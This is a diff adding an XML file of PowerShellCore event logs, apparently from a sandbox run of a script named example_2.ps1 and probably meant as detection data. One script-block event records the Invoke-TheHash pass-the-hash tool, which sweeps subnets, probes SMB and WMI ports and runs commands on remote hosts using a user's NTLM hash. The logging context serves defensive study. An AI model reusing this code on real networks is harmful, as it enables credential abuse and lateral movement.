@@ -1,0 +1,304 @@
+<root>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShellCore" Guid="{f90714a8-5509-434a-bf6d-b1624c8a19a2}" />
+      <EventID>40961</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>4</Task>
+      <Opcode>1</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2025-12-17T21:22:04.2118864Z" />
+      <EventRecordID>1285</EventRecordID>
+      <Correlation ActivityID="{0dd58d78-6f9a-0001-5999-d50d9a6fdc01}" />
+      <Execution ProcessID="3892" ThreadID="4380" />
+      <Channel>PowerShellCore/Operational</Channel>
+      <Computer>DESKTOP-U2U3HDH</Computer>
+      <Security UserID="S-1-5-21-564872773-1291138996-2393293407-1001" />
+    </System>
+    <EventData>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShellCore" Guid="{f90714a8-5509-434a-bf6d-b1624c8a19a2}" />
+      <EventID>53504</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>111</Task>
+      <Opcode>10</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2025-12-17T21:22:05.3432254Z" />
+      <EventRecordID>1286</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="3892" ThreadID="1232" />
+      <Channel>PowerShellCore/Operational</Channel>
+      <Computer>DESKTOP-U2U3HDH</Computer>
+      <Security UserID="S-1-5-21-564872773-1291138996-2393293407-1001" />
+    </System>
+    <EventData>
+      <Data Name="param1">3892</Data>
+      <Data Name="param2">DefaultAppDomain</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShellCore" Guid="{f90714a8-5509-434a-bf6d-b1624c8a19a2}" />
+      <EventID>40962</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>4</Task>
+      <Opcode>2</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2025-12-17T21:22:05.6811402Z" />
+      <EventRecordID>1287</EventRecordID>
+      <Correlation ActivityID="{0dd58d78-6f9a-0001-5999-d50d9a6fdc01}" />
+      <Execution ProcessID="3892" ThreadID="4380" />
+      <Channel>PowerShellCore/Operational</Channel>
+      <Computer>DESKTOP-U2U3HDH</Computer>
+      <Security UserID="S-1-5-21-564872773-1291138996-2393293407-1001" />
+    </System>
+    <EventData>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShellCore" Guid="{f90714a8-5509-434a-bf6d-b1624c8a19a2}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>2</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2025-12-17T21:22:06.1309126Z" />
+      <EventRecordID>1288</EventRecordID>
+      <Correlation ActivityID="{0dd58d78-6f9a-0002-ae97-d50d9a6fdc01}" />
+      <Execution ProcessID="3892" ThreadID="4428" />
+      <Channel>PowerShellCore/Operational</Channel>
+      <Computer>DESKTOP-U2U3HDH</Computer>
+      <Security UserID="S-1-5-21-564872773-1291138996-2393293407-1001" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">function Invoke-TheHash
+{
+    [CmdletBinding()]
+    param
+    (
+        [parameter(Mandatory=$true)][Array]$Targets,
+        [parameter(Mandatory=$false)][Array]$TargetsExclude,
+        [parameter(Mandatory=$true)][String]$Username,
+        [parameter(Mandatory=$false)][String]$Domain,
+        [parameter(Mandatory=$false)][String]$Service,
+        [parameter(Mandatory=$false)][String]$Command,
+        [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",
+        [parameter(Mandatory=$true)][ValidateSet("SMBExec","WMIExec")][String]$Type,
+        [parameter(Mandatory=$false)][Int]$PortCheckTimeout = 100,
+        [parameter(Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
+        [parameter(Mandatory=$false)][Switch]$PortCheckDisable,
+        [parameter(Mandatory=$false)][Int]$Sleep,
+        [parameter(Mandatory=$false)][Switch]$SMB1
+    )
+
+    $target_list = New-Object System.Collections.ArrayList
+    $target_list_singles = New-Object System.Collections.ArrayList
+    $target_list_subnets = New-Object System.Collections.ArrayList
+
+    if($Type -eq 'WMIExec')
+    {
+        $Sleep = 10
+    }
+    else
+    {
+        $Sleep = 150
+    }
+
+    foreach($target in $Targets)
+    {
+        if($target.contains("/"))
+        {
+            $target_split = $target.split("/")[0]
+            [uint32]$subnet_mask_split = $target.split("/")[1]
+
+            $target_address = [System.Net.IPAddress]::Parse($target_split)
+
+            if($subnet_mask_split -ge $target_address.GetAddressBytes().Length * 8)
+            {
+                throw "Subnet mask is not valid"
+            }
+
+            $target_count = [System.math]::Pow(2,(($target_address.GetAddressBytes().Length * 8) - $subnet_mask_split))
+
+            $target_start_address = $target_address.GetAddressBytes()
+            [array]::Reverse($target_start_address)
+
+            $target_start_address = [System.BitConverter]::ToUInt32($target_start_address,0)
+            [uint32]$target_subnet_mask_start = ([System.math]::Pow(2, $subnet_mask_split)-1) * ([System.Math]::Pow(2,(32 - $subnet_mask_split)))
+            $target_start_address = $target_start_address -band $target_subnet_mask_start
+
+            $target_start_address = [System.BitConverter]::GetBytes($target_start_address)[0..3]
+            [array]::Reverse($target_start_address)
+
+            $target_address = [System.Net.IPAddress] [byte[]] $target_start_address
+
+            $target_list_subnets.Add($target_address.IPAddressToString) &gt; $null
+
+            for ($i=0; $i -lt $target_count-1; $i++)
+            {
+                $target_next =  $target_address.GetAddressBytes()
+                [array]::Reverse($target_next)
+                $target_next =  [System.BitConverter]::ToUInt32($target_next,0)
+                $target_next ++
+                $target_next = [System.BitConverter]::GetBytes($target_next)[0..3]
+                [array]::Reverse($target_next)
+
+                $target_address = [System.Net.IPAddress] [byte[]] $target_next
+                $target_list_subnets.Add($target_address.IPAddressToString) &gt; $null
+            }
+
+            $target_list_subnets.RemoveAt(0)
+            $target_list_subnets.RemoveAt($target_list_subnets.Count - 1)
+        }
+        else
+        {
+            $target_list_singles.Add($target) &gt; $null
+        }
+    }
+
+    $target_list.AddRange($target_list_singles)
+    $target_list.AddRange($target_list_subnets)
+
+    foreach($target in $TargetsExclude)
+    {
+        $target_list.Remove("$Target")
+    }
+
+    foreach($target in $target_list)
+    {
+        if($type -eq 'WMIExec')
+        {
+            if(!$PortCheckDisable)
+            {
+                $WMI_port_test = New-Object System.Net.Sockets.TCPClient
+                $WMI_port_test_result = $WMI_port_test.BeginConnect($target,"135",$null,$null)
+                $WMI_port_test_success = $WMI_port_test_result.AsyncWaitHandle.WaitOne($PortCheckTimeout,$false)
+                $WMI_port_test.Close()
+            }
+
+            if($WMI_port_test_success -or $PortCheckDisable)
+            {
+                Invoke-WMIExec -username $Username -domain $Domain -hash $Hash -command $Command -target $target -sleep $Sleep
+            }
+        }
+        elseif($Type -eq 'SMBExec')
+        {
+            if(!$PortCheckDisable)
+            {
+                $SMB_port_test = New-Object System.Net.Sockets.TCPClient
+                $SMB_port_test_result = $SMB_port_test.BeginConnect($target,"445",$null,$null)
+                $SMB_port_test_success = $SMB_port_test_result.AsyncWaitHandle.WaitOne($PortCheckTimeout,$false)
+                $SMB_port_test.Close()
+            }
+
+            if($SMB_port_test_success -or $PortCheckDisable)
+            {
+                Invoke-SMBExec -username $Username -domain $Domain -hash $Hash -command $Command -CommandCOMSPEC $CommandCOMSPEC -Service $Service -target $target -smb1:$smb1 -sleep $Sleep
+            }
+        }
+    }
+}
+
+function ConvertTo-TargetList
+{
+    [CmdletBinding()]
+    param ([parameter(Mandatory=$true)][Array]$Invoke_TheHash_Output)
+
+    $target_list = New-Object System.Collections.ArrayList
+
+    foreach($target in $ITHOutput)
+    {
+        if($target -like "* on *" -and $target -notlike "* denied *" -and $target -notlike "* failed *" -and $target -notlike "* is not *")
+        {
+            $target_index = $target.IndexOf(" on ")
+            $target_index += 4
+            $target = $target.SubString($target_index,($target.Length - $target_index))
+            $target_list.Add($target) &gt; $null
+        }
+    }
+
+    return $target_list
+}</Data>
+      <Data Name="ScriptBlockId">c30d2737-5205-4666-9a24-84a1d945cfed</Data>
+      <Data Name="Path">C:\ProgramData\psandman\inputs\example_2.ps1</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShellCore" Guid="{f90714a8-5509-434a-bf6d-b1624c8a19a2}" />
+      <EventID>4103</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>106</Task>
+      <Opcode>20</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2025-12-17T21:22:06.2626974Z" />
+      <EventRecordID>1289</EventRecordID>
+      <Correlation ActivityID="{0dd58d78-6f9a-0002-ae97-d50d9a6fdc01}" />
+      <Execution ProcessID="3892" ThreadID="4428" />
+      <Channel>PowerShellCore/Operational</Channel>
+      <Computer>DESKTOP-U2U3HDH</Computer>
+      <Security UserID="S-1-5-21-564872773-1291138996-2393293407-1001" />
+    </System>
+    <EventData>
+      <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 7.5.4
+        Host ID = 2e9fd708-2cf3-431a-bb47-275bd382b44d
+        Host Application = C:\Program Files\PowerShell\7\pwsh.dll -NonInteractive -File C:\ProgramData\psandman\inputs\example_2.ps1
+        Engine Version = 7.5.4
+        Runspace ID = b10d713b-e6f9-49f6-9105-da564fdabc8a
+        Pipeline ID = 1
+        Command Name = example_2.ps1
+        Command Type = ExternalScript
+        Script Name = 
+        Command Path = C:\ProgramData\psandman\inputs\example_2.ps1
+        Sequence Number = 8
+        User = DESKTOP-U2U3HDH\rizz
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data>
+      <Data Name="UserData">
+      </Data>
+      <Data Name="Payload">CommandInvocation(example_2.ps1): "example_2.ps1"
+CommandInvocation(Out-Default): "Out-Default"
+</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShellCore" Guid="{f90714a8-5509-434a-bf6d-b1624c8a19a2}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>2</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2025-12-17T21:22:06.2683064Z" />
+      <EventRecordID>1290</EventRecordID>
+      <Correlation ActivityID="{0dd58d78-6f9a-0000-0495-d50d9a6fdc01}" />
+      <Execution ProcessID="3892" ThreadID="4428" />
+      <Channel>PowerShellCore/Operational</Channel>
+      <Computer>DESKTOP-U2U3HDH</Computer>
+      <Security UserID="S-1-5-21-564872773-1291138996-2393293407-1001" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">$global:?</Data>
+      <Data Name="ScriptBlockId">c811e323-3d8c-4c0b-a0d4-5c6d285f0d3e</Data>
+      <Data Name="Path">
+      </Data>
+    </EventData>
+  </Event>
+</root>
